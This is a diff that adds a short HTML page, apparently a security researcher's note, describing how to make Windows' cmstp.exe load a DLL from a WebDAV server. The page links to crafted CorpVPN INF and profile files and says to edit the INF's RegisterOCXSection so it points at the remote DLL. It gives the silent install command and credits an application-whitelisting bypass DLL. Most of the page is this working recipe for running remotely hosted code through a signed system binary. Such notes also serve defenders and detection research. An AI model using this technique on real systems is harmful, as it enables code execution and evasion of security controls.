@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>DLL From Webdav Using CMSTP</title>
+</head><body>TL;DR – Load DLL from Webdav<br/>
+Download these files (file names are important):<br/>
+https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-cmp<br/>
+https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-cms<br/>
+https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-inf<br/>
+<br/>
+Adjust the [RegisterOCXSection] in the inf file to point to your DLL hosted on your Webdav server.<br/>
+<br/>
+Then run this command (The names of the files are important):<br/>
+cmstp.exe /ni /s c:\cmstp\CorpVPN.inf<br/>
+<br/>
+Note that this will actually install a VPN profile, I have not found any clever ways of just loading the DLL yet.<br/>
+<br/>
+AllTheThings.dll is borrowed from the almighty Casey Smith aka @Subtee – And can be found here:<br/>
+https://github.com/subTee/AllTheThings – Thanks Casey!</body></html>
